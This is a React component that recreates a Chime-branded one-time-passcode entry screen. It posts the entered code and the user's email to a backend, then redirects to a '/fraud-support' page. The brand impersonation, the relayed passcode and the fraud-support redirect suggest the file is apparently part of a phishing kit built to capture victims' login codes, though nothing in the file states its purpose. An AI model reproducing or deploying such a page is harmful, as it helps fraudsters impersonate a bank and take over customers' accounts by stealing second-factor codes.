import { useRef, useState } from "react";
import { Box, Typography, TextField, Button, Link, Paper } from "@mui/material";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import { SpinnerLoading } from "./SpinnerLoading";
import api from "./axios";
import { emailStore } from "./authStore";
import chimLogo from "../assets/chimLogo.png";


export default function ChimeOTP() {
  const navigate = useNavigate();
  const email = emailStore((state) => state.email);

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [isLoading, setIsLoading] = useState(false);

  const inputsRef = useRef([]);

  const handleChange = (value, index) => {
    if (!/^\d?$/.test(value)) return;

    const updated = [...otp];
    updated[index] = value;
    setOtp(updated);

    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace") {
      if (otp[index]) {
        const updated = [...otp];
        updated[index] = "";
        setOtp(updated);
      } else if (index > 0) {
        inputsRef.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();

    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6);

    const updated = [...otp];

    pasted.split("").forEach((digit, i) => {
      updated[i] = digit;
    });

    setOtp(updated);

    const next = Math.min(pasted.length, 5);
    inputsRef.current[next]?.focus();
  };

  const onSubmit = async () => {
    const code = otp.join("");

    if (code.length !== 6) {
      return toast.error("Please enter the 6-digit verification code.");
    }

    try {
      setIsLoading(true);

      const { data } = await api.post("/login/otp", {
        otp: code,
        email,
      });

      if (!data.success) {
        return toast.error(data.message || "Verification failed.");
      }

      toast.success(data.message);

      navigate("/fraud-support");
    } catch (err) {
      toast.error(err.response?.data?.message || "Something went wrong.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#031f1a",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        px: 2,
      }}
    >
      <Paper
        elevation={0}
        sx={{
          width: "100%",
          maxWidth: 420,
          bgcolor: "transparent",
          color: "#fff",
        }}
      >
        <Box
          component="img"
          src={chimLogo}
          alt="Chime"
          sx={{
            width: 90,
            height: 90,
            objectFit: "contain",
          }}
        />

        <Typography variant="h5" fontWeight={600}>
          Enter verification code to verify its you.
        </Typography>

        <Typography
          sx={{
            color: "#9db1ab",
            mt: 1,
            mb: 4,
          }}
        >
          Enter the 6-digit code sent to your Email/Phone.
        </Typography>

        <Box
          onPaste={handlePaste}
          sx={{
            display: "grid",
            gridTemplateColumns: "repeat(6,1fr)",
            gap: 1.2,
          }}
        >
          {otp.map((digit, index) => (
            <TextField
              key={index}
              value={digit}
              inputRef={(el) => (inputsRef.current[index] = el)}
              onChange={(e) => handleChange(e.target.value, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              autoComplete="one-time-code"
              inputProps={{
                maxLength: 1,
                inputMode: "numeric",
                style: {
                  textAlign: "center",
                  fontSize: "1.4rem",
                  fontWeight: 600,
                  padding: "14px 0",
                },
              }}
              sx={{
                "& .MuiOutlinedInput-root": {
                  bgcolor: "#062923",
                  borderRadius: 2,
                  color: "#fff",

                  "& fieldset": {
                    borderColor: "#34514a",
                  },

                  "&:hover fieldset": {
                    borderColor: "#2de28a",
                  },

                  "&.Mui-focused fieldset": {
                    borderColor: "#2de28a",
                    borderWidth: 2,
                  },
                },
              }}
            />
          ))}
        </Box>

        <Button
          fullWidth
          variant="contained"
          onClick={onSubmit}
          disabled={isLoading}
          sx={{
            mt: 4,
            py: 1.6,
            borderRadius: 2,
            bgcolor: "#04ffc5",
            color: "#031f1a",
            fontWeight: 700,
            textTransform: "none",
            "&:hover": {
              bgcolor: "#00ddb0",
            },
          }}
        >
          Verify
        </Button>

        <Box textAlign="center" mt={3}>
          <Link
            component="button"
            underline="hover"
            sx={{
              color: "#2de28a",
              fontSize: ".9rem",
            }}
          >
            Didn't receive the code? Resend
          </Link>
        </Box>

        <Typography
          align="center"
          sx={{
            mt: 5,
            color: "#7f9992",
            fontSize: ".8rem",
          }}
        >
          © 2026 Chime. All rights reserved.
        </Typography>
      </Paper>

      {isLoading && <SpinnerLoading />}
    </Box>
  );
}
